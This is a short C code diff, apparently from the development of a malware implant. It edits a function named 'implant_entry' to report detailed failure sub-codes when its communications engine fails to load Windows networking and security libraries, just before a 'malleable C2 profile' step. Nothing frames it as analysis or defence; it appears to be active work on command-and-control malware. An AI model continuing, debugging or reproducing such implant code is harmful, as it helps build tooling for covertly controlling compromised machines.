@@ -168,8 +168,14 @@ void implant_entry(PVOID param) {
 
     /* ---- Step 7: Initialize communications engine ---- */
     status = comms_init(&g_ctx);
-    if (!NT_SUCCESS(status))
+    if (!NT_SUCCESS(status)) {
+        /* Sub-codes: 160=no k32, 161=no LoadLib, 162=no ws2_32,
+           163=ws2 export missing, 164=no secur32 */
+        DWORD sub = (DWORD)(status & 0xFFF);
+        if (sub >= 0x160 && sub <= 0x16F)
+            DEV_FAIL(sub);
         DEV_FAIL(16);
+    }
 
     /* ---- Step 7b: Initialize malleable C2 profile (if embedded) ---- */
     /* Profile blob is expected to be provided via config update or
